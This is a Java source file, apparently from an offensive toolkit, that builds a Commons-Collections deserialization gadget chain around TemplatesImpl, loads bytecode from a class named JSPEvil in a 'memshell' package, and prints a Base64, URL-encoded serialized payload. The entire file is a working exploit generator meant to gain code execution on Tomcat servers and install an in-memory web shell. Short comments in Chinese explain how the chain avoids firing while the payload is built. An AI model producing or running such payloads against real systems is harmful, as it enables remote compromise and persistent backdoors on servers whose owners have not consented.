package com.tomcat.koishi_Gadgets;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.tomcat.memshell.JSPMemShell.JSPEvil;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class CommonCollection11 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = ClassPool.getDefault().get(JSPEvil.class.getName()).toBytecode();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_name", "koiShi");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer transformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = DefaultedMap.decorate(innerMap, transformer);
        TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, templates);
        Map extraMap = new HashMap();
        extraMap.put(tiedmapentry, "KoiShi");
        outerMap.clear();//因为TiedMapEntry构造的value为TemplatesImpl对象
        setFieldValue(transformer, "iMethodName", "newTransformer");//之前传入getClass是为了防止它代码在本地执行

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream);
        os.writeObject(extraMap);
        os.close();

        String payload = URLEncoder.encode(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
        System.out.println(payload);

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException, NoSuchFieldException {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }
}

